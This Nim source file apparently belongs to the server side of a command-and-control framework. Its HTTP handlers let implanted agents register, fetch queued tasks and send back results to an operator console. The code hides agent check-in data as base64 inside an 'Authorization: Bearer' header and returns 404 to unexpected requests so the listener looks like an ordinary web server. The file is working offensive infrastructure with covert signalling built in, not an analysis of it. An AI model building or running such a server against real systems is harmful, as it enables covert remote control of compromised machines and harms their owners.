import prologue, json, terminal, strformat
import sequtils, strutils, times, base64

import ./handlers
import ../[utils, globals]
import ../../common/[types, utils, serialize]

proc error404*(ctx: Context) {.async.} = 
    resp "", Http404

#[
    GET /tasks
    Called from agent to check for new tasks
]#
proc httpGet*(ctx: Context) {.async.} = 

    # Check headers
    # Heartbeat data is hidden base64-encoded within "Authorization: Bearer" header, between a prefix and suffix 
    if not ctx.request.hasHeader("Authorization"): 
        resp "", Http404 
        return 

    let checkinData: seq[byte] = string.toBytes(decode(ctx.request.getHeader("Authorization")[0].split(".")[1]))

    try: 
        var response: seq[byte]
        let tasks: seq[seq[byte]] = getTasks(checkinData)

        if tasks.len <= 0: 
            resp "", Http200
            return

        # Create response, containing number of tasks, as well as length and content of each task
        # This makes it easier for the agent to parse the tasks
        response.add(cast[uint8](tasks.len))

        for task in tasks:
            response.add(uint32.toBytes(uint32(task.len))) 
            response.add(task)
        
        await ctx.respond(
            code = Http200,
            body = Bytes.toString(response)
        )

        # Notify operator that agent collected tasks
        {.cast(gcsafe).}:
            let date = now().format("dd-MM-yyyy HH:mm:ss")
            cq.writeLine(fgBlack, styleBright, fmt"[{date}] [*] ", resetStyle, fmt"{$response.len} bytes sent.")

    except CatchableError:
        resp "", Http404

#[
    POST /results
    Called from agent to post results of a task
]#
proc httpPost*(ctx: Context) {.async.} = 
    
    # Check headers
    # If POST data is not binary data, return 404 error code
    if ctx.request.contentType != "application/octet-stream": 
        resp "", Http404
        return

    try:        
        # Differentiate between registration and task result packet
        var unpacker = Unpacker.init(ctx.request.body)
        let header = unpacker.deserializeHeader()

        if cast[PacketType](header.packetType) == MSG_REGISTER: 
            if not register(string.toBytes(ctx.request.body)):
                resp "", Http400
                return
            resp "", Http200
            
        elif cast[PacketType](header.packetType) == MSG_RESULT: 
            handleResult(string.toBytes(ctx.request.body))

    except CatchableError:
        resp "", Http404

    return